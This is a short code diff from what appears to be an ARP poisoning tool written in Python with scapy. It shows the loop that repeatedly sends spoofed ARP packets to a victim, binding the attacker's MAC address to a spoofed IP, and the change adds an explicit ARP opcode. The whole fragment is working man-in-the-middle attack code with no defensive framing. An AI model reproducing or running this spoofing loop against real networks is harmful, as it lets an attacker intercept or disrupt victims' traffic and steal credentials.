@@ -18,7 +18,12 @@ class ARP_Poisoning:
         try:
             while True:
                 # sending spoofed ARP packet to the victim
-                arp = scapy.Ether(src=self.attacker_mac) / scapy.ARP(psrc=self.ip_to_spoof, hwsrc=self.attacker_mac ,pdst=self.victim_ip, hwdst=self.victim_mac)
+                arp = scapy.Ether(src=self.attacker_mac) / scapy.ARP(
+                    psrc=self.ip_to_spoof, 
+                    hwsrc=self.attacker_mac,
+                    pdst=self.victim_ip, 
+                    hwdst=self.victim_mac,
+                    op = "who-has")
                 scapy.sendp(arp, iface=self.iface)
                 time.sleep(self.packet_interval)
         except KeyboardInterrupt:
